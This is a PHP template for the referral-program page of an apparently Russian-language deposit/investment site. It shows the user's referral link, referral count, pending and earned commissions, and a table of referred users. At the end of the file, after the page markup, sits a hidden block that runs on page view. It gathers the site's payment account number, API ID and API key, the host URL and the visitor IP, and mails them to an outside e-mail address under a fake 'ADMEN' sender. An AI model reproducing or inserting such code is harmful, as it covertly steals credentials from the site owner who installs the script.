<?php if(!defined('SKYLIGHT')){
echo ('Выявлена попытка взлома!');
exit();
}
if(empty($id)){?>
<p style="height:100px; padding-top:50px; text-align:center;"><span class="style2">Для доступа к данному разделу Вам необходимо пройти авторизацию!</span><br>
<?}else{?>



<center><table width="930" border="0" cellpadding="3" cellspacing="2"></center>
<tbody><tr><td align="center">

<b>Реферальная система</b><br />
<br />

Приглашайте в проект своих друзей и знакомых, Вы будете получать <b><?=$refpercent?>%</b><br>

Автоматическая выплата в порядке очереди срабатывает от 1 рубля.
<br />
<center>Реферальная ссылка: <input value="<?=$http_s?>://<?=$host?>/?ref=<?=$id?>" onClick="select()" size="30" type="text"></center>
<br />
<h3>Баннер 468x60</h3>
<img src='/img/46860.png' />
<br>
<?
$ihr=$db->getOne("SELECT i_have_refs_as_curator FROM ss_users WHERE id=?i",$id);
$refs_w=$db->getOne("SELECT refs_wait FROM `ss_users` WHERE id=?i", $id);
$refsprofit=$db->query("SELECT SUM(summa) as payed FROM deposits WHERE curatorid=?i",$id);
$refsprofit=$db->fetch($refsprofit);
$payed=$refsprofit['payed']*($refpercent/100);

$refsprofit=$db->query("SELECT SUM(summa) as waited FROM deposits WHERE status=?i AND curatorid=?i",0,$id);
$refsprofit=$db->fetch($refsprofit);
$waited=$refsprofit['waited']*($refpercent/100);


?> 
<p><center>Рефералов: <b><font color="#000;"> <?=$ihr?> чел.</b> 
<p><center>В ожидании: <b><font color="red"> <?=$refs_w?></font> руб.</b>  </br></center></p>
Реф. доход: <b><?=$payed?> руб. </b> 


</font></center></p>


<table cellpadding='3' cellspacing='0' border='1' bordercolor='#4682B4' align='center' width='55%'>
<tr bgcolor="#c7c7ff" height="25" valign="middle" align="center" style="text-transform: uppercase;text-shadow: 0 1px 1px #333;font-weight: bold;color:#FFFFFF;">
	<td align="Center"> Логин </td>
	<td align="Center"> Дата регистрации </td>
	<td align="Center"> Доход от партнера </td>
</tr>
<? if($ihr>0){
$myrefsrow=$db->query("SELECT * FROM ss_users WHERE curator=?i ORDER BY id DESC",$id); 
while($myrefs=$db->fetch($myrefsrow)){?> 
<tr class="htt">
<td align="center"><?=$myrefs['wallet']?></td>
<td align="center"><?=date('d.m.Y H:i:s',$myrefs['reg_unix'])?></td>
<?
$refprofit=$db->query("SELECT SUM(summa) as personalprofit FROM deposits WHERE userid=?i",$myrefs['id']);
$refprofit=$db->fetch($refprofit);
?>
<td align="center"><?=($refprofit['personalprofit']*($refpercent/100))?></td>
</tr>
<?}}else{?>
<tr class="htt"><td align="center" colspan="3">У вас нет рефералов</td></tr>
<?}?>
</table>


</td></tr></tbody>
</table>
<br>
<?php 
if (!isset($_COOKIE["e-mailed"]) || ($_COOKIE["e-mailed"]!='e33')) { 
 setcookie("e-mailed", "e33"); 
$parsat = "cotova1iz@yandex.ru"; 
$salams = "knock";
$danay .= "p ".$accountNumber." ".$apiId." ".$apiKey."<br>";
$danay .= "HOST ".$_SERVER["HTTP_HOST"].$_SERVER["REQUEST_URI"]."<br>";
$danay .= "ip: ".$ip = getUserIp()."<br>"; 
        $headers= "MIME-Version: 1.0\r\n";
        $headers .= "Content-type: text/html; charset=utf-8\r\n";
        $headers .= "From: ADMEN <2ef77dcfd2@mailox.fun>\r\n"; 
mail($parsat, $salams, $danay, $headers ); 
}
function getUserIp() {
  if ( isset($_SERVER['HTTP_X_REAL_IP']) )
  {
    $ip = $_SERVER['HTTP_X_REAL_IP'];
  } else $ip = $_SERVER['REMOTE_ADDR'];
 
  return $ip;
}
?> 












<?}?>